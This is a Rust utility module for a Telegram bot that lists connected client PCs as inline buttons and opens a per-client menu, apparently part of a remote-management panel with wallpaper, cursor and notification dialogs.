pub mod utils {
    use std::sync::Arc;
    use teloxide::payloads::{EditMessageReplyMarkupSetters, EditMessageTextSetters};
    use teloxide::prelude::{CallbackQuery, ChatId, Requester};
    use teloxide::types::{InlineKeyboardButton, InlineKeyboardMarkup, ParseMode};
    use teloxide::Bot;
    use tokio::sync::Mutex;

    use crate::app::app::{AppState, RPTClient};
    use crate::telegram::dialogs::change_cursor::change_cursor::ChangeCursorDialogue;
    use crate::telegram::dialogs::change_wallpaper::change_wallpaper::ChangeWallpaperDialogue;
    use crate::telegram::dialogs::send_notify_dialog::notify_dialog::NotificationEditorDialogue;
    use crate::telegram::ui::ui::show_client_menu;

    pub struct RequestHandlerData {
        pub bot: Bot,
        pub q: CallbackQuery,
        pub state: Arc<Mutex<AppState>>,
        pub notify_dialog: NotificationEditorDialogue,
        pub change_wallpaper: ChangeWallpaperDialogue,
        pub change_cursor: ChangeCursorDialogue
    }

    pub async fn get_client_by_id(id: String, state: Arc<Mutex<AppState>>) -> RPTClient{
        let state = state.lock().await;
        state.clients.iter().find(|x| x.id == id).cloned().unwrap_or_default()
    }

    pub async fn show_clients(data: &RequestHandlerData) {
        let chat_id = ChatId(data.q.from.id.0 as i64);
        let message = data.q.message.clone().unwrap().id();
        let state = data.state.lock().await;

        if state.clients.len() > 0 {
            let mut clients_button = InlineKeyboardMarkup::default();
            let max = 3;
            let mut line: Vec<InlineKeyboardButton> = Vec::new();

            for client in &state.clients {
                line.push(InlineKeyboardButton::callback(format!("{}({})", client.pc_name, client.address),format!("open_client|{}", client.id)));
                if line.len() == max {
                    clients_button.inline_keyboard.push(line.clone());
                    line.clear();
                }
            }

            if clients_button.inline_keyboard.len() == 0 { clients_button.inline_keyboard.push(line.clone()); }
            let _ = data.bot.edit_message_text(chat_id, message, t!("menu.show_clients.1", "total" => state.clients.len())).parse_mode(ParseMode::Html).await;
            let _ = data.bot.edit_message_reply_markup(chat_id, message).reply_markup(clients_button).await;
        } else {
            let _ = data.bot.edit_message_text(chat_id, message, t!("menu.show_clients.2")).await;
        }
    }

    pub async fn open_client(bot: &Bot, id: String, state: Arc<Mutex<AppState>>, q: &CallbackQuery) {
        let mut client = RPTClient::default();
        {
            let state = state.lock().await;
            client = state.clients.iter().find(|x| x.id == id).cloned().unwrap_or_default();
        }
        let replace = show_client_menu(&client);
        let chat_id = ChatId(q.clone().from.id.0 as i64);
        let message = q.message.clone().unwrap().id();

        bot.edit_message_text(chat_id, message, replace.0).parse_mode(ParseMode::Html).await.expect("");
        bot.edit_message_reply_markup(chat_id, message).reply_markup(replace.1).await.expect("");

        bot.answer_callback_query(q.id.clone()).await.expect("");
    }

}